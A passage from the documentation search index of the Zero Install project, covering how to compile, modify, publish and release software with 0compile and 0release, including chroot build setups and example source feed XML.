specified in the source feed, which actually builds the software (using the standard GNU build system in this case).</p> <p>Note that the command installs to the <code>gnu-hello-linux-x86_64</code> directory rather than to the usual <code>/usr/local</code>.</p> <p>Assuming the build is successful, <code>gnu-hello-linux-x86_64</code> will contain the final result, including a handy <code>gnu-hello-linux-x86_64/0install/feed.xml</code> local feed file, which you can use to run the new binary (note: this used to be <code>gnu-hello-linux-x86_64/0install/GNU-Hello.xml</code> on older versions of 0compile):</p> <pre><code>$ 0install run gnu-hello-linux-x86_64/0install/feed.xml\nHello, world!\n</code></pre> <p>In fact, since <code>GNU-Hello</code> doesn't list any run-time dependencies, we could have just run the <code>gnu-hello-linux-x86_64/bin/hello</code> binary directly in this case. For more complex programs, the feed file will be useful. You can also pass it to <code>0install add-feed</code> to register the new binary under the program's normal URI:</p> <pre><code>$ 0install run -c http://0install.net/tests/GNU-Hello.xml\nInterface 'http://0install.net/tests/GNU-Hello.xml' has no usable implementations\n\n$ 0install add-feed gnu-hello-linux-x86_64/0install/feed.xml\n1) Add as feed for 'http://0install.net/tests/GNU-Hello.xml'\n\n$ 0install run -c http://0install.net/tests/GNU-Hello.xml\nHello, world!\n</code></pre> <p>If everything worked, you can now delete the <code>build</code> directory to save space. However, if you're planning to modify the source and rebuild (described in the next section) then you'll want to leave it there, as it will make rebuilding faster.</p> <p>For future reference, there is also a <code>gnu-hello-linux-x86_64/0install/build-environment.xml</code> file. This is a selections file, as produced by <code>0install select --source --xml</code>, but with a few extra details of the build added, including the hostname of the machine used for the build, a timestamp and your username. You can use this to rebuild later with the same environment (e.g. using this exact version of <code>make</code>). The file is written before the build starts, so the build process may add to it.</p>"},{"location":"tools/0compile/#modifying-the-source","title":"Modifying the source","text":"<p>By default, <code>0compile</code> keeps the source code in the (read-only) Zero Install cache, so if you want to make changes, the first step is to make a copy of it:</p> <pre><code>$ 0compile copy-src\nCopied as '/home/me/GNU-Hello/src'\n</code></pre> <p>Edit the source as needed with the text editor of your choice. For example, we can change the message (here we're using ed, the standard text editor):</p> <pre><code>$ ed src/hello.c\n5207\n%s/Hello, world!/Goodbye, world!/\nwq\n5209\n</code></pre> <p>Recompile with <code>0compile build</code> as before:</p> <pre><code>$ 0compile build\n$ 0install run gnu-hello-linux-x86_64/0install/feed.xml\nGoodbye, world!\n</code></pre> <p>If you compare the new <code>gnu-hello-linux-x86_64/0install</code> directory with the old one, you'll discover a couple of differences:</p> <ul> <li>A new file is present, <code>gnu-hello-linux-x86_64/0install/from-1.3.patch</code>, containing a diff between the original sources and your modified ones (to display this without rebuilding, use <code>0compile diff</code>).</li> <li>The version number in the local feed has <code>-1</code> appended, to indicate that this version has been modified.</li> </ul> <p>These two features make it very easy to keep track of what you changed, which may well come in handy later! However, if you are making larger changes to the code then you will want to use a proper version control system (such as Git).</p>"},{"location":"tools/0compile/#publishing-the-binary","title":"Publishing the binary","text":"<p>Use <code>0compile publish</code> to create the archive and feed:</p> <pre><code>$ 0compile publish\nGenerated archive 'gnu-hello-linux-x86_64-1.3.tar.bz2' and feed 'GNU-Hello-1.3.xml'.\nUpload it to a repository with:\n0repo add GNU-Hello-1.3.xml\n</code></pre> <p>You can test it with:</p> <pre><code>$ 0install run GNU-Hello-1.3.xml\n</code></pre> <p>To publish the feed and archive, use 0repo (see that page for configuration details):</p> <pre><code>$ 0repo add GNU-Hello-1.3.xml\n</code></pre>"},{"location":"tools/0compile/#bundling-dependencies","title":"Bundling dependencies","text":"<p>You might want to build on a machine without network access, or to archive everything needed to build a particular program. To do that, use this command:</p> <pre><code>$ 0compile include-deps\n</code></pre> <p>The source code and all dependencies will be copied into a new <code>dependencies</code> sub-directory. When building, this directory is added to the implementation cache search path (using <code>0install run --with-store</code>).</p>"},{"location":"tools/0compile/#legacy-helper-features","title":"Legacy helper features","text":"<p>0compile has some special code to detect and handle some common cases in legacy code:</p>"},{"location":"tools/0compile/#generated-pkgconfig-files-with-absolute-paths","title":"Generated <code>pkgconfig</code> files with absolute paths","text":"<p>If <code>$DISTDIR</code> ends up containing a directory called <code>pkgconfig</code>, it checks each <code>.pc</code> file inside for an absolute prefix. If found, it is changed to a relative path.</p> <p>Note</p> <p>For \"pure\" Zero Install libraries, just use a relative path (e.g. <code>prefix=${pcfiledir}/..</code>) in the <code>.pc</code> file in the source, and copy it unchanged to <code>$DISTDIR</code>.</p>"},{"location":"tools/0compile/#build-dependencies-containing-usrliblibso-broken-symlinks","title":"Build dependencies containing <code>/usr/lib/lib*.so</code> broken symlinks","text":"<p>RPM unpacks all packages over the root, so one package can have a symlink to a file provided by a different package. This is often used to set the default version of a library in RPM packages. e.g.</p> <ul> <li><code>-devel</code> package: <code>libSDL.so</code> -&gt; <code>libSDL-1.2.so.0.11.2</code> (broken link)</li> <li>runtime package: provides <code>libSDL-1.2.so.0.11.2</code></li> </ul> <p>Since Zero Install keeps every package in its own directory, this doesn't work. Therefore, 0compile searches for such broken links, searches for a matching target, and creates a fixed link in a temporary directory, added to <code>LD_LIBRARY_PATH</code>. This makes it easy to depend on unmodified <code>-devel</code> packages which were designed for non-Zero Install systems.</p> <p>Note</p> <p>A \"pure\" Zero Install library wouldn't need to include the version number in the library filename, so no symlink would be needed. If you did want to include the number in the filename, the symlink to it would go in the runtime package, not the <code>-dev</code>el package.</p>"},{"location":"tools/0compile/#build-dependencies-with-lib64-directories","title":"Build dependencies with lib64 directories","text":"<p>If the feed tries to add a directory under <code>lib</code> or <code>usr/lib</code> to <code>$PKG_CONFIG_PATH</code>, and the directory doesn't exist, 0compile uses the corresponding <code>lib64</code> directory instead, if present. This is for existing RPMs which use a different directory structure for different architectures.</p>"},{"location":"tools/0compile/#libtool-archive-la-files","title":"Libtool archive (.la) files","text":"<p>0compile searches for <code>lib/*.la</code> files in <code>$DISTDIR</code> and automatically deletes them for you (there is a safely check that it really is a <code>libtool</code> file first). These files were only needed on very old systems that don't support dynamic linking. These days they just cause trouble by using absolute paths which were only valid during the build.</p>"},{"location":"tools/0compile/#recreating-a-build-environment","title":"Recreating a build environment","text":"<p>If you want to rebuild a binary package, see if it includes the <code>0install/build-environment.xml</code> file that 0compile generates automatically. If so, you can re-create the build like this:</p> <pre><code>$ 0compile setup .../someprog-binary/0install/build-environment.xml some-prog\n$ cd some-prog\n$ 0compile build\n</code></pre> <p>For example, in the GNU-Hello case this would allow you to build using the same source code and the exact same version of <code>make</code> used in the original compile.</p>"},{"location":"tools/0compile/#making-source-available","title":"Making source available","text":"<p>If you want to publish source code so that other people can compile it using 0compile, see 0compile: Developers.</p>"},{"location":"tools/0compile/#building-in-a-clean-chroot","title":"Building in a clean chroot","text":"<p>If you want to build the source package in a clean <code>chroot</code> sandbox environment, see 0compile: Chroot Build.</p>"},{"location":"tools/0compile/chroot-build/","title":"0compile: Chroot Build","text":"<p>This page explains how to build in a <code>chroot</code> sandbox environment using 0compile. It offers a few advantages:</p> <ul> <li>Building doesn't affect the host environment, and the host doesn't influence the build.</li> <li>Builds can target a different architecture, such as building x86 packages from a x64 host.</li> <li>The build sandbox is smaller than a virtual machine, and the download is typically smaller.</li> </ul> <p>The build system (<code>chroot</code>) comes with development tools such as gcc and make, and the <code>0launch</code> command.</p> <p>Warning</p> <p>This page is very out-of-date. Consider using Docker to sandbox builds instead.</p>"},{"location":"tools/0compile/chroot-build/#chroot-setup","title":"Chroot setup","text":"<p>Alternatives:</p> <ul> <li>Build on a Debian system (including Ubuntu), using APT and .deb with <code>pbuilder</code></li> <li>Build on a Red Hat system (including Fedora), using Yum and .rpm with <code>mock</code></li> <li>Build on a Linux From Scratch system, using only source tarballs with <code>chroot</code></li> </ul> <p>For all systems we use a <code>build</code> directory, that is bind-mounted inside the chroot, to hold our build results.</p>"},{"location":"tools/0compile/chroot-build/#debian","title":"Debian","text":"<p>http://pbuilder.alioth.debian.org/</p> <p>Install and configure the software:</p> <pre><code>$ sudo apt-get install pbuilder\n\n$ mkdir -p build\n$ echo \"BINDMOUNTS='build'\" &gt;&gt; /etc/pbuilderrc\n</code></pre> <p>Prepare the build environment cache:</p> <pre><code>MIRROR=http://ftp.debian.org/debian/\nDIST=lenny\n\nARCH=i386 ## or amd64\nCPU=i486 ## or x86_64\n\nBASEDIR=/var/cache/pbuilder\nTGZ=${BASEDIR}/${DIST}-${ARCH}.tgz\n\n$ sudo pbuilder --create --basetgz $TGZ --mirror $MIRROR \\\n                --distribution $DIST --architecture $ARCH \\\n                --extrapackages \"zeroinstall-injector\"\n</code></pre> <p>Enter the build environment chroot:</p> <pre><code>$ setarch $CPU sudo pbuilder --login --basetgz $TGZ\n## cat /etc/debian_version\n5.0.8\n## 0launch --version\n0launch (zero-install) 0.34\nCopyright (C) 2007 Thomas Leonard\n...\n</code></pre> <p>Has <code>build-essential</code> dependencies:</p> <ul> <li><code>dpkg-dev</code><ul> <li><code>dpkg</code></li> <li><code>perl5</code></li> <li><code>perl-modules</code></li> <li><code>cpio</code></li> <li><code>bzip2</code></li> <li><code>lzma</code></li> <li><code>patch</code></li> <li><code>make</code></li> <li><code>binutils</code></li> <li><code>libtimedate-perl</code></li> <li><code>gcc | c-compiler</code></li> </ul> </li> <li><code>g++</code></li> <li><code>libc6-dev | libc-dev</code></li> <li><code>make</code></li> </ul>"},{"location":"tools/0compile/chroot-build/#red-hat","title":"Red Hat","text":"<p>https://fedorahosted.org/mock/</p> <p>Install and configure the software:</p> <pre><code>$ su -c \"yum install mock\"\n$ su -c \"usermod -G mock $USER\"\n\n$ mkdir -p build\n$ echo \"config_opts['plugin_conf']['bind_mount_opts']['dirs'].append(('./build', '/build'))\" &gt;&gt; /etc/mock/site-defaults.cfg\n</code></pre> <p>Prepare the build environment cache:</p> <pre><code>ARCH=i386 ## or x86_64\n\nROOT=epel-5-$ARCH\n\n$ mock --root=$ROOT --arch=$ARCH --init\n$ mock --root=$ROOT --arch=$ARCH --install \"zeroinstall-injector\"\n</code></pre> <p>Enter the build environment chroot:</p> <pre><code>$ mock --root=$ROOT --arch=$ARCH --shell\n&gt; cat /etc/redhat-release\nCentOS release 5.6 (Final)\n&gt; 0launch --version\n0launch (zero-install) 0.38\nCopyright (C) 2007 Thomas Leonard\n...\n\n$ mock --root=$ROOT --arch=$ARCH --clean\n</code></pre> <p>Has <code>buildsys-build</code> dependencies:</p> <ul> <li><code>bash</code></li> <li><code>buildsys-macros</code></li> <li><code>bzip2</code></li> <li><code>coreutils</code></li> <li><code>cpio</code></li> <li><code>diffutils</code></li> <li><code>elfutils</code></li> <li><code>gcc-c++</code></li> <li><code>gcc</code></li> <li><code>gzip</code></li> <li><code>make</code></li> <li><code>patch</code></li> <li><code>perl</code></li> <li><code>redhat-release</code></li> <li><code>redhat-rpm-config</code></li> <li><code>rpm-build</code></li> <li><code>sed</code></li> <li><code>tar</code></li> <li><code>unzip</code></li> <li><code>which</code></li> </ul>"},{"location":"tools/0compile/chroot-build/#linux-from-scratch","title":"Linux From Scratch","text":"<p>http://www.linuxfromscratch.org/lfs/</p> <p>Build LFS:</p> <ul> <li>Read the Linux From Scratch Book</li> </ul> <p>Enter chroot:</p> <pre><code>export LFS=/mnt/lfs\n\nsudo mount -v --bind /dev $LFS/dev\n\nsudo mount -vt devpts devpts $LFS/dev/pts\nsudo mount -vt tmpfs shm $LFS/dev/shm\nsudo mount -vt proc proc $LFS/proc\nsudo mount -vt sysfs sysfs $LFS/sys\n\nsudo mkdir -pv $LFS/build\nsudo mount -v --bind ./build $LFS/build\n\n$ sudo chroot $LFS /usr/bin/env -i \\\n    HOME=/root TERM=\"$TERM\" PS1='\\u:\\w\\$ ' \\\n    PATH=/bin:/usr/bin:/sbin:/usr/sbin \\\n    /bin/bash --login\n## cat /etc/lfs-release\n6.8\n</code></pre> <p>BLFS packages:</p> <ul> <li>OpenSSL (Python dependency)</li> <li>Python</li> <li>GnuPG</li> <li>PCRE (Glib dependency)</li> <li>GLib (PyGObject dependency)</li> <li>PyGObject</li> </ul> <p>Zero Install itself:</p> <ul> <li>ZeroInstall-Injector</li> </ul>"},{"location":"tools/0compile/chroot-build/#0compile-setup","title":"0compile setup","text":"<p>Now we have a chroot with <code>0launch</code>, and can add <code>0compile</code>:</p> <pre><code>CMD=\"0compile\"\nURI=\"https://apps.0install.net/0install/0compile.xml\"\n\n$ yes Y | /usr/bin/0launch -cd $URI\n$ 0alias -d /usr/bin $CMD $URI\n</code></pre> <p>Note</p> <p>Depending on your build OS and Python version, you might need to use an older version of 0compile.</p>"},{"location":"tools/0compile/chroot-build/#0compile-build","title":"0compile build","text":"<p>Begin with downloading the source code, in console mode:</p> <pre><code>$ 0launch -cd -s http://www.example.com/interfaces/foo.xml\n</code></pre> <p>Then we setup the build sub-directory using the source feed:</p> <pre><code>$ cd /build\n$ 0compile setup http://www.example.com/interfaces/foo.xml foo\n</code></pre> <p>Next we proceed with building the binary from the source:</p> <pre><code>$ cd foo\n$ 0compile build\n</code></pre> <p>Finally we tell 0compile to prepare the binary feed/archive:</p> <pre><code>$ 0compile publish http://www.example.com/implementations\n</code></pre> <p>After exiting the chroot, we can find the results in build/foo.</p>"},{"location":"tools/0compile/chroot-build/#publish-results","title":"Publish results","text":"<p>The new binary feed is now ready to be merged with our source feed, signed (using <code>0publish --xmlsign</code>), and published with the archives.</p> <p>Since we used a new clean chroot to build the binary, we can be reasonably sure that all dependencies are included in the source feed.</p>"},{"location":"tools/0compile/chroot-build/#future-directions","title":"Future directions","text":"<p>In the future it might be possible to use the Open Build Service (OBS), to build Zero Install packages using a distributed development platform.</p> <p>Currently it (OBS) supports building RPM and Debian packages, those can be converted to Zero Install feeds using pkg2zero (when relocatable).</p>"},{"location":"tools/0compile/developers/","title":"0compile: Developers","text":"<p>This page explains how to publish source code using Zero Install. Publishing source this way means that:</p> <ul> <li>Users can compile it easily using 0compile.</li> <li>Build dependencies, such as header files and build tools, can be downloaded automatically.</li> <li>0release can automatically compile binaries for your software during the release process.</li> </ul>"},{"location":"tools/0compile/developers/#making-source-available","title":"Making source available","text":"<p>There are two common situations:</p> <ul> <li>You already have a source tarball somewhere and you want to publish an XML feed saying how to download and compile it (ideally, no changes should be needed to support 0install). For this, you should first read the Guide to packaging binaries.</li> <li>You have a development checkout (e.g. a Git clone or similar) and you want to say how to compile it. For this, you should first read the page about local feeds.</li> </ul> <p>To make source code available for others to use you need to add source implementations to the program's feed file. This is almost exactly the same as adding binaries, except that you give <code>src</code> as the machine (CPU) type:</p> <p></p> <p>(if you want to script this process, take a look at 0template)</p> <p>You can also edit the XML directly, which gives more control. A minimal source implementation might look like this:</p> <pre><code>&lt;implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"&gt;\n  &lt;command name='compile' path='Makefile'&gt;\n    &lt;runner interface='https://apps.0install.net/devel/make.xml'&gt;\n      &lt;arg&gt;-f&lt;/arg&gt;\n    &lt;/runner&gt;\n  &lt;/command&gt;\n&lt;/implementation&gt;\n</code></pre> <p>Note</p> <p>You only need to use <code>arch='*-src'</code> to publish implementations for things that need to be compiled. Shell scripts, etc should not be marked as source code; use <code>arch=\"*-*\"</code> instead (which is the default anyway if <code>arch</code> is not given). For header files (-dev packages), there will often be a source implementation that generates the header files, but the resulting headers are not source (and will often be architecture-specific, e.g. <code>Linux-i386</code>).</p> <p>The job of the <code>compile</code> command is to call the actual build system. It is executed inside the <code>build</code> directory (<code>$BUILDDIR</code>). It must compile the source in <code>$SRCDIR</code>, putting the final result (ready for distribution) in <code>$DISTDIR</code>. The path to the generated feed for the new binary is <code>$BINARYFEED</code>, if you need it during the build.</p> <p>Instead of giving a <code>&lt;runner&gt;</code>, you may prefer to use a shell command. This is useful if you need to run more than one command. However, if the command starts to get complicated, you should move it to a script, either inside the main source archive or in a separate dependency, and just set this attribute to the command to run the script):</p> <pre><code>&lt;implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"&gt;\n  &lt;command name='compile'\n    shell-command='\"$SRCDIR/configure\" --prefix=\"$DISTDIR\" &amp;&amp; make install'/&gt;\n\n  &lt;requires interface='https://apps.0install.net/devel/make.xml'&gt;\n    &lt;executable-in-path name='make'/&gt;\n  &lt;/requires&gt;\n&lt;/implementation&gt;\n</code></pre> <p>Starting with 0compile 1.1, this even works on Windows (it uses win-bash).</p> <p>There are also some extra attributes you can add to the <code>implementation</code> element:</p> <code>compile:binary-main</code> Deprecated. Use <code>&lt;compile:implementation&gt;</code> instead (see below). <code>compile:dup-src</code> Some programs insist on creating files in their source directory, which is typically a read-only directory when using Zero Install. In this case, set <code>compile:dup-src='../img/true'</code> and 0compile will copy everything in <code>$SRCDIR</code> into <code>build</code> before building. <code>compile:binary-lib-mappings</code> (binary library major mappings) This is needed if you want to use 0install to compile a <code>-dev</code> package (containing header files) that works with a distribution-provided runtime package; see MakeHeaders for details."},{"location":"tools/0compile/developers/#customising-the-binary-implementation","title":"Customising the binary implementation","text":"<p>You can specify a template <code>&lt;implementation&gt;</code> for the binary using <code>&lt;compile:implementation&gt;</code>. You can use this, for example, to add <code>&lt;command&gt;</code> elements to it. Here's a more complex example for a Java program:</p> <pre><code>  ... xmlns:compile=\"http://zero-install.sourceforge.net/2006/namespaces/0compile\" ...\n\n  &lt;implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"&gt;\n\n    &lt;command name=\"compile\" path=\"src/Makefile\"&gt;\n      &lt;runner interface='https://apps.0install.net/devel/make.xml'&gt;\n        &lt;arg&gt;-f&lt;/arg&gt;\n      &lt;/runner&gt;\n\n      &lt;compile:implementation arch='*-*'&gt;\n        &lt;environment name='CLASSPATH' insert='.'/&gt;\n        &lt;requires interface=\"https://apps.0install.net/utils/graphviz.xml\"/&gt;\n        &lt;command name='run'&gt;\n          &lt;runner interface='https://apps.0install.net/java/jre.xml'/&gt;\n          &lt;arg&gt;com.example.MainClass&lt;/arg&gt;\n        &lt;/command&gt;\n      &lt;/compile:implementation&gt;\n    &lt;/command&gt;\n\n    &lt;requires interface=\"https://apps.0install.net/java/iris.xml\" compile:include-binary='true'/&gt;\n    &lt;requires interface=\"https://apps.0install.net/java/jdk.xml\"&gt;\n      &lt;environment name='PATH' insert='bin'/&gt;\n    &lt;/requires&gt;\n  &lt;/implementation&gt;\n</code></pre> <p>The interesting bits here are:</p> <code>arch=\"*-src\"</code> tells us that the root <code>&lt;implementation&gt;</code> describes some source code. <code>&lt;compile:implementation&gt;</code> this is the template for the implementation that will be created by the compile. <code>arch='*-*'</code> indicates that the generated binary is platform independent (Java bytecode). <code>&lt;command name='run'&gt;</code> says how to run the resulting binary (by using the Java runtime). <p>The dependencies are:</p> <code>graphviz</code> and <code>openjdk-jre</code> only used at run-time (since they occur inside the <code>&lt;compile:implementation&gt;</code>). <code>openjdk-jdk</code> only used at compile-time (occurs directly inside the source <code>&lt;implementation&gt;</code>). <code>iris</code> used at compile-time and at run-time (has <code>compile:include-binary</code> attribute). <p>Finally, there is a <code>compile:if-0install-version</code> attribute that you can place on any element in the template. 0compile will convert this to a plain <code>if-0install-version</code> in the generated output (you can't use <code>if-0install-version</code> directly because 0install would strip them out as appropriate for its version before 0compile saw them).</p>"},{"location":"tools/0compile/developers/#pinning-version-ranges","title":"Pinning version ranges","text":"<p>Sometimes, you have a build time dependency with a wide range of possible versions, but the generated binary will have a runtime dependency on whichever version was used to compile it. The <code>compile:pin-components</code> attribute on a <code>&lt;version&gt;</code> element in the template will expand into <code>before</code> and <code>after</code> attributes that require the binary version to match the first n components of the version used to compile it. For example, if this program is compiled using Python 2.7.3, then the binary will have <code>&lt;version not-before='2.7' before='2.8'/&gt;</code>:</p> <pre><code>&lt;compile:implementation&gt;\n  &lt;runner interface='https://apps.0install.net/python/python.xml'&gt;\n    &lt;version compile:pin-components=\"2\"/&gt;\n  &lt;/runner&gt;\n&lt;/compile:implementation&gt;\n</code></pre> <p>(added in 0compile 1.4)</p>"},{"location":"tools/0compile/developers/#tips","title":"Tips","text":""},{"location":"tools/0compile/developers/#using-a-separate-source-feed","title":"Using a separate source feed","text":"<p>You can keep the source implementations in a separate file (<code>MyProg-src.xml</code>) and add a feed from the main feed, e.g.:</p> <pre><code>  &lt;feed src='http://mysite/interfaces/MyProg-src.xml' arch='*-src'/&gt;\n</code></pre> <p>The <code>arch</code> attribute lets the injector know that it doesn't need to fetch this file unless it's looking for source code.</p>"},{"location":"tools/0compile/developers/#making-library-headers-available-dev-packages","title":"Making library headers available (-dev packages)","text":"<p>See Make-headers for information about publishing library source and <code>-dev</code> packages.</p>"},{"location":"tools/0compile/developers/#python-distutils","title":"Python distutils","text":"<p>You should use the <code>--build-base</code> option to make distutils build to 0compile's build directory, not under the source code (which is read-only). Unfortunately, this option isn't available with the <code>install</code> command, so you have to do the build in two steps. A typical command is:</p> <pre><code>cd \"$SRCDIR\" &amp;&amp;\npython setup.py build --build-base=\"$BUILDDIR/build\" &amp;&amp;\ncd \"$BUILDDIR\" &amp;&amp;\npython \"$SRCDIR\"/setup.py install --home=\"$DISTDIR\" --skip-build\n</code></pre>"},{"location":"tools/0compile/developers/#examples","title":"Examples","text":"<p>There are some template projects which can be used as a starting point for publishing your own software for various languages and build systems.</p>"},{"location":"tools/0compile/developers/#further-reading","title":"Further reading","text":"Example: SCons This example shows how to compile a simple \"Hello world\" program using the SCons build system. Both the source and SCons are fetched using Zero Install."},{"location":"tools/0compile/example-scons/","title":"0compile: SCons example","text":"<p>Name: Hello-scons Maintainer: Thomas Leonard License: Public domain Source: Git repository Zero Install feed: http://0install.net/tests/Hello-scons.xml</p> <p>Hello-scons is a simple \"Hello world\" program written in C. It is built using the SCons build tool.</p> <p>Its purpose is to demonstrate the use of 0compile to fetch build dependencies; you do not need to install SCons manually on your system in order to build it.</p> <p>This example assumes that you have already read the main 0compile tutorial.</p> <p>You can try it out by using the <code>setup</code> command as usual:</p> <pre><code>$ 0compile setup http://0install.net/tests/Hello-scons.xml Hello-scons\n</code></pre> <p>0compile will create a <code>Hello-scons</code> directory for the build. You will be prompted to choose the versions of Hello-scons and SCons:</p> <p></p> <p>To build, change into the new directory and use the build command:</p> <pre><code>$ cd Hello-scons\n$ 0compile build\nExecuting: \"$SCONS/scons.py\" -f \"$SRCDIR/SConstruct\" --srcdir=\"$SRCDIR\" \"$DISTDIR\"\n</code></pre> <p>This creates a <code>hello-scons-ARCH</code> directory ready for use and/or distribution, and a <code>build</code> directory with some temporary files, such as <code>hello.o</code>. This is used only to speed up later rebuilds.</p> <p>To run:</p> <pre><code>$ 0install run hello-scons-linux-x86_64/0install/feed.xml\nHello world!\n</code></pre> <p>To see (or modify) a copy of the source:</p> <pre><code>$ 0compile copy-src\nCopied as '/home/me/Hello-scons/src'\n</code></pre> <p>The main issues with using SCons with 0compile are that:</p> <ul> <li> <p>SCons defaults to saving build files in the source directory. 0compile requires that the source directory is not written to during the build (since the 0install cache is read-only). Therefore, you must use <code>--srcdir</code>.</p> </li> <li> <p>By default, SCons resets all environment variables. This means that instead of compiling against the library versions you chose, it will build against whatever happens to be the default on the system today.</p> </li> </ul> <p>The <code>src/SConstruct</code> file shows how to fix these problems.</p> <p>For more information (including how to publish the binary using Zero Install), see the main 0compile tutorial.</p>"},{"location":"tools/0compile/example-scons/#building-from-a-git-checkout","title":"Building from a Git checkout","text":"<p>To build the latest Git version of hello-scons:</p> <pre><code>$ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/hello-scons\n$ cd hello-scons\n$ 0compile build\n$ 0install run hello-scons-linux-x86_64/0install/feed.xml\nHello world!\n</code></pre>"},{"location":"tools/0release/","title":"0release","text":"<p>Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: https://github.com/0install/0release Zero Install feed: https://apps.0install.net/0install/0release.xml</p> <p>0release can be used to make new releases of your software. It handles details such as setting the version number and release date, tagging the release in your version control system and updating your Zero Install feed.</p> <p>The general process for an architecture-independent package (e.g. a Python program) is shown in the diagram below (releasing a source package and multiple binary packages is also possible):</p> <p></p> <p>After doing some development (so you have something to release!) you use 0release to prepare a new release. It will:</p> <ol> <li>Commit a release revision in your version control system (e.g. with a version of <code>1.3</code>) on a new temporary branch.</li> <li>Export the release revision and create a tarball for distribution.</li> <li>Unpack the release and run the unit tests.</li> <li>Update the version numbers in your version control system again (e.g. to <code>1.3-post</code>).</li> </ol> <p>You can then run any final (manual) tests on the release. If you're happy with the result, then 0release can publish it (e.g. submit the release to 0repo, and push the new commits and tag to your public version control system). Otherwise, 0release will discard the temporary branch so that you can fix the problems and try again.</p> <p>Note</p> <p>You don't need to use this program to make your software available through Zero Install. You can just create a tarball using your normal process and then publish a feed for it. However, 0release can automate some of the steps for you. It's especially useful for new projects, where you don't yet have an established process. Having a program to handle new releases brings several advantages over doing it manually:</p> <ul> <li>Making a new release is quicker, since many steps are automated.</li> <li>You can't forget some steps (did you forget to tag version 1.2? did you remember to compile the translations in 1.4? etc).</li> <li>You get a consistent structure each time (are your archives called <code>myprog-V.VV-linux.tgz</code> or <code>My-Prog-Linux-V.VV.tar.gz</code>?).</li> <li>If someone else needs to make a release, they will follow the same process.</li> </ul> <p>Git is fully supported. It should be fairly easy to support other (distributed) version control systems.</p>"},{"location":"tools/0release/#preparing-your-source-repository","title":"Preparing your source repository","text":"<p>You'll need a local feed within your source directory (under version control). This contains the same information as a normal published feed would (name, description, dependencies, etc). The only differences are:</p> <ul> <li>The local feed refers to a local directory (e.g. <code>id=\".\"</code> for the directory containing the local feed) rather than a secure hash.</li> <li>It has no digital signature.</li> <li>The version will be a development version (e.g <code>1.2-post</code> if your last released version was <code>1.2</code>).</li> </ul> <p>Having a local feed is useful even if you don't use <code>0release</code>, because it lets people check out a development snapshot of your program and then register it (using <code>0install add-feed</code>) or run it directly with Zero Install handling its dependencies.</p> <p>A minimal Hello World example is available for testing. You can check it out like this, using the Git version control system:</p> <pre><code>$ git clone git://github.com/0install/hello-python.git\n</code></pre> <p>To check that you can run it, use 0install on the feed:</p> <pre><code>$ cd hello-python\n$ 0install run HelloWorld.xml\nHello World!\n</code></pre> <p><code>HelloWorld.xml</code> is the local feed. Its contents look like this:</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"&gt;\n  &lt;name&gt;HelloWorld&lt;/name&gt;\n  &lt;summary&gt;minimal demonstration package for 0release&lt;/summary&gt;\n  &lt;description&gt;\n    This program outputs the message \"Hello World\". You can create new releases of it\n    using 0release.\n  &lt;/description&gt;\n\n  &lt;homepage&gt;http://0install.net/0release.xml&lt;/homepage&gt;\n\n  &lt;feed-for interface='http://0install.net/tests/HelloWorld.xml'/&gt;\n\n  &lt;implementation id=\".\" version=\"0.1-pre\"&gt;\n    &lt;command name='run' path='hello.py'&gt;\n      &lt;runner interface='https://apps.0install.net/python/python.xml'&gt;\n        &lt;version before='3'/&gt;\n      &lt;/runner&gt;\n    &lt;/command&gt;\n  &lt;/implementation&gt;\n&lt;/interface&gt;\n</code></pre> <p>Note the <code>&lt;feed-for&gt;</code> element. This is where the main feed is (or will be) published. If you want to follow this tutorial, change it to point to a location to which you can upload files (e.g. <code>http://localhost/~me/testing/HelloWorld.xml</code>) and commit the change (<code>git commit -a</code>).</p> <p>You should add any dependencies inside the <code>&lt;implementation&gt;</code> element (see the feed specification for details, or edit the feed using 0publish-gui if you want a graphical interface). This example program is so simple it doesn't have any dependencies beyond its interpreter: Python &lt; 3</p>"},{"location":"tools/0release/#creating-the-releases-directory","title":"Creating the releases directory","text":"<p>Each time you create a new release, the resulting files go in your <code>releases</code> directory. Create the directory now and then run <code>0release</code> inside it, giving it the location of your local feed.</p> <pre><code>$ mkdir -p ~/releases/hello\n$ cd ~/releases/hello\n$ 0install run https://apps.0install.net/0install/0release.xml ~/hello-python/HelloWorld.xml\nSetting up releases directory for HelloWorld\nSuccess - created script:\n ~/releases/hello/make-release\nNow edit it with your local settings.\nThen, create new releases by running it.\n</code></pre> <p>This will create a single executable file in the directory, called <code>make-release</code>. Run this whenever you want to create a new release of your software.</p> <ul> <li>The <code>make-release</code> file contains local configuration information (e.g. the location of the local feed on your computer).</li> <li>General information about your program goes in the source directory so it can be shared by other developers.</li> </ul> <p>The final script might look like this:</p> <pre><code>#!/bin/sh\n\n# Your public version control repository. When publishing, the new\n# HEAD and the release tag will be pushed to this using a command\n# such as \"git push origin master v0.1\"\n# If unset, you'll have to update it yourself.\nPUBLIC_SCM_REPOSITORY=origin\n\ncd `dirname \"$0\"`\nexec 0install run https://apps.0install.net/0install/0release.xml \\\n --release ~/hello/HelloWorld.xml \\\n --public-scm-repository=\"$PUBLIC_SCM_REPOSITORY\" \\\n \"$@\"\n</code></pre> <p>Warning</p> <p>Do not put <code>make-release</code> under the project's version control! First, because it contains user-specific information, and secondly because if you make a mistake then 0release will make you retract the release and restart the whole release process from the beginning because you changed a file that's part of the release... this is not fun ;-)</p>"},{"location":"tools/0release/#creating-a-release-candidate","title":"Creating a release candidate","text":"<p>When you want to make a new release, simply run the <code>make-release</code> script, like this:</p> <pre><code>$ cd ~/releases/hello\n$ ./make-release\nReleasing HelloWorld\nSnapshot version is 0.1-pre\nVersion number for new release [0.1]:\n</code></pre> <p>You are prompted to enter the version number for the new release. You can just press Return to accept the default of <code>0.1</code> (since the version in the local feed was <code>0.1-pre</code>). It then prints:</p> <pre><code>Releasing version 0.1\nHEAD is now at 387535a Updated feed-for to localhost for testing\nSKIPPED unit tests for ~/releases/hello/0.1/helloworld-0.1/HelloWorld.xml (no 'test' command)\nWrote source feed as helloworld-0.1.xml\nWrote changelog from start to here as changelog-0.1\n\nCandidate release archive: helloworld-0.1.tar.bz2\n(extracted to ~/releases/hello/0.1/helloworld-0.1 for inspection)\n\nPlease check candidate and select an action:\nP) Publish candidate (accept)\nF) Fail candidate (delete release-status file)\n(you can also hit CTRL-C 